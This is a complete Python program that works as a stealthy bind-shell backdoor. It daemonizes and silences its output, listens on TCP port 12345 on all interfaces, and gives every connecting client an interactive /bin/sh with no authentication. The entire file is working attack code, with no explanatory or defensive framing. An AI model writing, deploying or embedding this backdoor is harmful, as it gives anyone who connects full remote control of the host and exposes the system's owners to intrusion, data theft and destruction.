import socket
import subprocess
import os
import sys

def daemonize():
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as err:
        sys.exit(1)

    os.chdir('/')
    os.setsid()
    os.umask(0)

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as err:
        sys.exit(1)

    sys.stdout.flush()
    sys.stderr.flush()
    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'a+') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
    with open('/dev/null', 'a+') as f:
        os.dup2(f.fileno(), sys.stderr.fileno())

def create_socket():
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('', 12345))
        server_socket.listen(5)
        return server_socket
    except socket.error as msg:
        sys.exit()

def handle_client(client_socket):
    os.dup2(client_socket.fileno(), 0)
    os.dup2(client_socket.fileno(), 1)
    os.dup2(client_socket.fileno(), 2)
    try:
        subprocess.run(['/bin/sh', '-i'])
    except Exception as e:
        pass
    client_socket.close()

def main():
    daemonize()
    server_socket = create_socket()
    while True:
        client_socket, addr = server_socket.accept()
        pid = os.fork()
        if pid == 0:
            server_socket.close()
            handle_client(client_socket)
            sys.exit()
        else:
            client_socket.close()

if __name__ == "__main__":
    main()
